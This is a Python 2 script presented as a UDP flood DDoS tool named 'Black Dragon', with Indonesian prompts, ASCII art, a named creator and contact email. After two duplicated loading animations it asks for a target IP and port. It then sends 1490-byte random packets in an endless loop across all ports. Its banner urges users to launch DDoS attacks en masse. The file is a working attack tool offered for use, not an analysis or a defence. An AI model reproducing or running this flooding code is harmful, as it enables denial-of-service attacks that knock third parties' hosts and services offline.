#Ddos
#Ga usah Recode asw
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

import os, sys, time, random
from sys import exit as keluar
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from sys import stdout
from os import system
m = '\x1b[1;91m'
h = '\x1b[1;92m'
k = '\x1b[1;93m'
b = '\x1b[1;94m'
u = '\x1b[1;95m'
c = '\x1b[1;96m'
p = '\x1b[0m'
i = '\x1b[1;90m'
v = '\x1b[1;38;5;198m'
j = '\x1b[1;38;5;208m'
w = (m, v, j, p, k, b, u, c)
W = pilih(w)

def load():
    l = 'B '
    a = 'L'
    g = 'A '
    i = 'C '
    n = 'K '
    P = '  '
    r = '. '
    h = '. '
    w = '. '
    u = '. '
    o = '. '
    s = '. '
    e = '. '
    S = '. '
    for z in range(90):
        waktu(0.1)
        stdout.write('\r                                  [\x1b[1;36m' + l[z % len(l)] + a[z % len(a)] + g[z % len(g)] + i[z % len(i)] + n[z % len(n)] + P[z % len(P)] + r[z % len(r)] + o[z % len(o)] + s[z % len(s)] + e[z % len(e)] + S[z % len(S)] + P[z % len(P)] + r[z % len(r)] + S[z % len(S)] + u[z % len(u)] + w[z % len(w)] + h[z % len(h)] + '\x1b[1;37m]')
        stdout.flush()
        
load()

import os, sys, time, random
from sys import exit as keluar
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from sys import stdout
from os import system
m = '\x1b[1;91m'
h = '\x1b[1;92m'
k = '\x1b[1;93m'
b = '\x1b[1;94m'
u = '\x1b[1;95m'
c = '\x1b[1;96m'
p = '\x1b[0m'
i = '\x1b[1;90m'
v = '\x1b[1;38;5;198m'
j = '\x1b[1;38;5;208m'
w = (m, v, j, p, k, b, u, c)
W = pilih(w)

def load():
    l = 'D '
    a = 'R '
    g = 'A'
    i = 'G '
    n = 'O '
    P = 'N '
    r = '. '
    h = '. '
    w = '. '
    u = '. '
    o = '. '
    s = '. '
    e = '. '
    S = '. '
    for z in range(90):
        waktu(0.1)
        stdout.write('\r                                  [\x1b[1;36m' + l[z % len(l)] + a[z % len(a)] + g[z % len(g)] + i[z % len(i)] + n[z % len(n)] + P[z % len(P)] + r[z % len(r)] + o[z % len(o)] + s[z % len(s)] + e[z % len(e)] + S[z % len(S)] + P[z % len(P)] + r[z % len(r)] + S[z % len(S)] + u[z % len(u)] + w[z % len(w)] + h[z % len(h)] + '\x1b[1;37m]')
        stdout.flush()
        
load()

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system('clear')
os.system("figlet Black Dragon |lolcat")   
print '\x1b[1;96m                   /\  /--\  '                
print '\x1b[1;96m           _______/  \/    1============== '
print '\x1b[1;96m  /\       /____            1oooooooooooooooo'
print '\x1b[1;96m  1-------/ /__|    O  /    1ooooooooooooooooo'
print '\x1b[1;96m  \--------____       /    /oooooooooooooooooo '
print '\x1b[1;96m   v v v v v \ \_____/  \ 1oooooooooooooooooo '
print '\x1b[1;96m   /\/\/\/\/\/\ /         \ooooooooooooooooo  ' 
print '\x1b[1;96m   \_______________      />>>>>>>>>>>>>>>>>  ' 
print '\x1b[1;96m   *Black Dragon*   \    /=================   '
print '\x1b[1;96m  \The Ultimate Shadow System '
print '\x1b[1;96m  /Creator:Sad-Boy1922\/    ' 
print
print "Distributed Denial Of Service(DDOS)"
print "Created Tools By sad Boy 1922"
print "Contact uss:"
print "e mail :rayw1922@gmail.com"
print "Youtube :Sad Boy 1922 "
print "Tidak semua serangan Ddos Membuat down secara permanen"
print "Karna itu Lakukan Serangan Ddos secara Massal"
print
ip = raw_input("Masukan Ip target  : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

    
